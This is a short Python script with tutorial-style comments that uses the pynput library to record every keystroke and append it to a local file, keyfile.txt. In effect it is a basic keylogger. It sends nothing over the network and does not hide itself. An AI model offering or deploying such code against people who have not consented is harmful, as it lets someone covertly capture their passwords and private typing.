## You need to import Keyboard as that is the libary for these methods to work.

from pynput import keyboard

## This defines the function of every key you type and converting it into a string. 

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey: ##Keyfile.txt is where the code will output all the pressed keys too. 
        try:
             char = key.char
             logKey.write(char)
        except AttributeError:
            if key == keyboard.Key.space: # this so the code understands when the user does a space to make it neater
                logKey.write(" ")
            elif key == keyboard.Key.backspace:
                logKey.write(" ")
            elif key == keyboard.Key.enter:
                logKey.write("\n")


if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
